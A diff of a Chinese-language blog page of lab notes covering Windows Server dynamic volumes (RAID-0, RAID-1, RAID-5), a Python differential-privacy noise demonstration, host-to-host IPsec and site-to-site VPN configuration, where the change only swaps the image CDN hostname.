-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291619227.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291619227.png" alt=""></p>
 <p>为了使用这两块磁盘进行下一步实验，将这三个卷删除。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291623413.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291623413.png" alt=""></p>
 <h3 id="带区卷（RAID-0）"><a href="#带区卷（RAID-0）" class="headerlink" title="带区卷（RAID-0）"></a>带区卷（RAID-0）</h3><p>（右击）未分配区域-新建带区卷-选中磁盘1和磁盘2-下一步</p>
 <p>此时可以发现这两个卷的大小必须相同，这也是带区卷的定义。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291626301.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291626301.png" alt=""></p>
 <p>转换为动态磁盘</p>
 <p>可以发现两块跨磁盘的空间属于同一个卷且大小相同，即跨区卷。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291625258.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291625258.png" alt=""></p>
 <h3 id="镜像卷（RAID-1）"><a href="#镜像卷（RAID-1）" class="headerlink" title="镜像卷（RAID-1）"></a>镜像卷（RAID-1）</h3><p>（右击）未分配区域-新建镜像卷-选中磁盘1和磁盘2-下一步</p>
 <p>这里的两块空间大小也必须相同。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291631922.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291631922.png" alt=""></p>
 <p>转换为动态磁盘</p>
 <p>可以发现两块跨磁盘的空间属于同一个卷且大小相同。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291632254.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291632254.png" alt=""></p>
 <p>这时我们尝试向该卷写入一些文件，看看是否两块磁盘上都有同样大小的数据。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291642758.png" alt=""></p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291643616.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291642758.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291643616.png" alt=""></p>
 <p>发现两块磁盘的大小相同，即数据内容相同，这便是镜像卷。</p>
 <h3 id="RAID-5卷（RAID-5）"><a href="#RAID-5卷（RAID-5）" class="headerlink" title="RAID-5卷（RAID-5）"></a>RAID-5卷（RAID-5）</h3><p>磁盘结构</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291654759.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291654759.png" alt=""></p>
 <p>（右击）未分配区域-新建镜像卷-选中磁盘0、磁盘1和磁盘2-下一步</p>
 <p>这些空间的大小也必须相同。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291653749.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291653749.png" alt=""></p>
 <p>转换为动态磁盘</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291655182.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291655182.png" alt=""></p>
 <p>注意这里的卷空间不再是某一个磁盘的大小，而是两个磁盘的大小（即2*1008MB=1.96GB），剩下的一个磁盘用于奇偶校验，当某个磁盘损坏时，利用剩下两个磁盘的数据自动恢复数据，具有很强的抗干扰性，这便是RAID-5卷。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291657993.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291657993.png" alt=""></p>
 <h2 id="差分隐私"><a href="#差分隐私" class="headerlink" title="差分隐私"></a>差分隐私</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>差分隐私（differential privacy）是密码学中的一种手段，旨在提供一种当从统计数据库查询时，最大化数据查询的准确性，同时最大限度减少识别其记录的机会。</p>
 <p>为了防止攻击者利用减法思维实施差分攻击获取到个人隐私，提出了差分隐私保护技术。</p>
 <p>当对有限数据集$D$进行一组查询函数操作<script type="math/tex">F = \{ f_{1},\ f_{2},\ldots,f_{n}\}</script>（如计数、求和、平均值、中位数或其他范围查询）所得到的查询结果$F(D)$，算法$M$对查询结果进行处理，使之满足隐私保护条件，此过程称为隐私保护机制。</p>
@@ -1889,51 +1889,51 @@ e^{- \varepsilon} \leq \frac{P(M(D) = V)}{P(M\left( D^{'} \right) = V)} \leq e^{
 <h3 id="对隐私保护预算-mathbf-varepsilon-的测试"><a href="#对隐私保护预算-mathbf-varepsilon-的测试" class="headerlink" title="对隐私保护预算$\mathbf{\varepsilon}$的测试"></a>对隐私保护预算$\mathbf{\varepsilon}$的测试</h3><p>以如下代码为例。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_noisy</span>(<span class="params">GSf, epsilon</span>):</span></span><br><span class="line">    beta = GSf / epsilon</span><br><span class="line">    u = np.random.random() - <span class="number">0.5</span></span><br><span class="line">    noisy_digit = <span class="number">0.0</span> - beta * np.sign(u) * np.log(<span class="number">1.0</span> - <span class="number">2</span> * np.<span class="built_in">abs</span>(u))</span><br><span class="line">    <span class="keyword">return</span> np.rint(noisy_digit)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    GSf = <span class="number">50</span>                                        <span class="comment"># 假设公司最高和最矮的两个人的身高差为50CM</span></span><br><span class="line">    epsilon = <span class="number">0.001</span></span><br><span class="line">    real_height = np.random.normal(<span class="number">170</span>, <span class="number">4</span>, <span class="number">100</span>)     <span class="comment"># 随机生成100个符合正态分布的身高</span></span><br><span class="line">    pseudo_height = []                              <span class="comment"># 添加噪声后的身高</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        pseudo_height.append(real_height[i] + get_noisy(GSf, epsilon))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;平均身高=&quot;</span>, np.average(real_height))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;添加噪声后的平均身高=&quot;</span>, np.average(pseudo_height))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;前三位的真实身高：&quot;</span>, real_height[:<span class="number">3</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;前三位干扰后的身高：&quot;</span>, pseudo_height[:<span class="number">3</span>])</span><br></pre></td></tr></table></figure>
 <p>当$\varepsilon = 1$时</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207041123326.png" alt="image38"></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207041123326.png" alt="image38"></p>
 <p>当$\varepsilon = 5$时</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207041124477.png" alt="image39"></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207041124477.png" alt="image39"></p>
 <p>当$\varepsilon = 10$时</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207041124406.png" alt="image40"></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207041124406.png" alt="image40"></p>
 <p>可见：</p>
 <p>$\varepsilon$越大，引入的噪声越小，隐私泄露的风险越大。</p>
 <p>$\varepsilon$越小，引入的噪声越大，隐私泄露的风险越小。</p>
 <p>特别地，当$\varepsilon = 0$时（这里我令epsilon = 0.001）</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207041124071.png" alt="image41"></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207041124071.png" alt="image41"></p>
 <p>引入的噪声足够大，但平均身高和干扰后的身高都不合实际，失去了隐私保护的意义。</p>
 <h2 id="主机对主机的IPSEC"><a href="#主机对主机的IPSEC" class="headerlink" title="主机对主机的IPSEC"></a>主机对主机的IPSEC</h2><p>先设置Windows Server No1的IP安全规则</p>
 <p>组策略管理编辑器-Windows设置-IP安全策略，在Active<br>Directory（XUWP05191643）-（右击）空白处-创建IP安全策略</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291702180.png" alt=""></p>
-<h3 id="添加新的IP安全规则"><a href="#添加新的IP安全规则" class="headerlink" title="添加新的IP安全规则"></a>添加新的IP安全规则</h3><p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291704984.png" alt=""></p>
-<h4 id="添加新的IP筛选器列表"><a href="#添加新的IP筛选器列表" class="headerlink" title="添加新的IP筛选器列表"></a>添加新的IP筛选器列表</h4><p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291706054.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291702180.png" alt=""></p>
+<h3 id="添加新的IP安全规则"><a href="#添加新的IP安全规则" class="headerlink" title="添加新的IP安全规则"></a>添加新的IP安全规则</h3><p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291704984.png" alt=""></p>
+<h4 id="添加新的IP筛选器列表"><a href="#添加新的IP筛选器列表" class="headerlink" title="添加新的IP筛选器列表"></a>添加新的IP筛选器列表</h4><p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291706054.png" alt=""></p>
 <p>源地址改为”我的IP地址”</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291707697.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291707697.png" alt=""></p>
 <p>目标地址改为”任何IP地址”</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291707829.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291707829.png" alt=""></p>
 <p>协议类型改为ICMP</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291707453.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291707453.png" alt=""></p>
 <p>选择我们刚刚添加的IP筛选器列表</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291708020.png" alt=""></p>
-<h4 id="添加新的筛选器操作"><a href="#添加新的筛选器操作" class="headerlink" title="添加新的筛选器操作"></a>添加新的筛选器操作</h4><p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291709504.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291708020.png" alt=""></p>
+<h4 id="添加新的筛选器操作"><a href="#添加新的筛选器操作" class="headerlink" title="添加新的筛选器操作"></a>添加新的筛选器操作</h4><p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291709504.png" alt=""></p>
 <p>选择”协商安全”</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291711970.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291711970.png" alt=""></p>
 <p>选择”完整性和加密”</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291711558.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291711558.png" alt=""></p>
 <p>选择我们刚刚创建的筛选器操作</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291711459.png" alt=""></p>
-<h4 id="设置预共享密钥"><a href="#设置预共享密钥" class="headerlink" title="设置预共享密钥"></a>设置预共享密钥</h4><p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291712430.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291711459.png" alt=""></p>
+<h4 id="设置预共享密钥"><a href="#设置预共享密钥" class="headerlink" title="设置预共享密钥"></a>设置预共享密钥</h4><p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291712430.png" alt=""></p>
 <h3 id="分配IP安全规则"><a href="#分配IP安全规则" class="headerlink" title="分配IP安全规则"></a>分配IP安全规则</h3><p><img src="image-20220629171306977" alt=""></p>
 <p>对Windows 10 Client-No1以相同步骤添加新的IP安全规则。</p>
 <h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>注意：Client-No1需要移出域XUWP05191643，并使用Client-No1的本地账号登录。</p>
 <p>当某端的IP安全规则未分配时，两侧均无法ping通。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291745056.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291745056.png" alt=""></p>
 <p>当两侧的IP安全规则均分配时，可以互相ping通。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291746848.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206291746848.png" alt=""></p>
 <h2 id="站点对站点的VPN"><a href="#站点对站点的VPN" class="headerlink" title="站点对站点的VPN"></a>站点对站点的VPN</h2><h3 id="配置网卡"><a href="#配置网卡" class="headerlink" title="配置网卡"></a>配置网卡</h3><p>VMnet1：</p>
 <p>SubNet：192.168.1.0/24</p>
 <p>VMnet8：</p>
 <p>SubNet：172.168.1.0/24</p>
 <p>Gateway：172.168.1.2</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302050562.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302050562.png" alt=""></p>
 <h3 id="配置服务器和客户机"><a href="#配置服务器和客户机" class="headerlink" title="配置服务器和客户机"></a>配置服务器和客户机</h3><p>内网服务器：</p>
 <p>主机名：Windows Server No1</p>
 <p>内网IP：192.168.1.100</p>
@@ -1945,57 +1945,57 @@ e^{- \varepsilon} \leq \frac{P(M(D) = V)}{P(M\left( D^{'} \right) = V)} \leq e^{
 <p>主机名：Windows Client No1</p>
 <p>外网IP：172.168.1.101</p>
 <h3 id="配置VPN服务器"><a href="#配置VPN服务器" class="headerlink" title="配置VPN服务器"></a>配置VPN服务器</h3><p>添加角色”网络策略和访问服务”和”远程访问”。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302126885.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302126885.png" alt=""></p>
 <p>添加服务”DirectAccess”和”路由”</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302127019.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302127019.png" alt=""></p>
 <p>服务器管理器-工具-路由和远程访问</p>
 <p>（右击）Server-No2-配置并启用路由和远程访问</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302157580.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302157580.png" alt=""></p>
 <p>选择”远程访问（拨号或VPN）”</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302200491.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302200491.png" alt=""></p>
 <p>选择”VPN”</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207041124577.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207041124577.png" alt=""></p>
 <p>选择外网网卡”Ethernet1”</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302200403.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302200403.png" alt=""></p>
 <p>因欲连接VPN的Client-No1是静态IP，所以选择”来自一个指定的地址范围”</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302201557.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302201557.png" alt=""></p>
 <p>配置整个后8位的地址</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302201116.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302201116.png" alt=""></p>
 <p>选择”是，设置此服务器与RADIUS服务器一起工作”</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302202942.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302202942.png" alt=""></p>
 <p>设置共享机密为：05191643</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302203850.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302203850.png" alt=""></p>
 <p>（右击）Server-No2-属性-安全</p>
 <p>设置预共享密钥为：05191643</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302204271.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302204271.png" alt=""></p>
 <h3 id="配置域控服务器"><a href="#配置域控服务器" class="headerlink" title="配置域控服务器"></a>配置域控服务器</h3><p>添加角色”网络策略和访问服务”</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302205252.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302205252.png" alt=""></p>
 <p>服务器管理器-工具-网络策略服务器-（右击）NPS（本地）-在Active<br>Diretory中注册服务器</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302208662.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302208662.png" alt=""></p>
 <p>（右击）RADIUS服务器-新建</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302209080.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302209080.png" alt=""></p>
 <p>为RADIUS设置友好名称和地址，输入此前设置的共享机密。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302210840.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302210840.png" alt=""></p>
 <p>服务器管理器-工具-Active Directory用户和计算机-Client<br>User-（右击）XuWanpeng-No1-属性-拨入-允许访问</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302211816.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302211816.png" alt=""></p>
 <p>控制面板-网络和Internet-网络和共享中心-设置新的连接或网络-连接到工作区</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302217462.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302217462.png" alt=""></p>
 <p>使用我的Internet连接</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207041125673.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202207041125673.png" alt=""></p>
 <p>输入VPN服务器的内网地址</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302219766.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302219766.png" alt=""></p>
 <p>（右击）VPN连接-属性</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302221886.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302221886.png" alt=""></p>
 <p>安全-按下图更改</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302243009.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302243009.png" alt=""></p>
 <p>高级设置-选择”使用预共享的密钥作身份验证”-输入预共享密钥</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302221301.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302221301.png" alt=""></p>
 <h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><p>（右击）VPN连接-连接/断开连接</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302226469.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302226469.png" alt=""></p>
 <p>输入允许访问的域用户的用户名、密码、域名（大概如下图）</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302248416.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302248416.png" alt=""></p>
 <p>当连接变为蓝色时即代表连接成功。</p>
-<p><img src="https://gcore.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302259193.png" alt=""></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/WanpengXu/myPicGo/img/202206302259193.png" alt=""></p>
 
         </div>
 
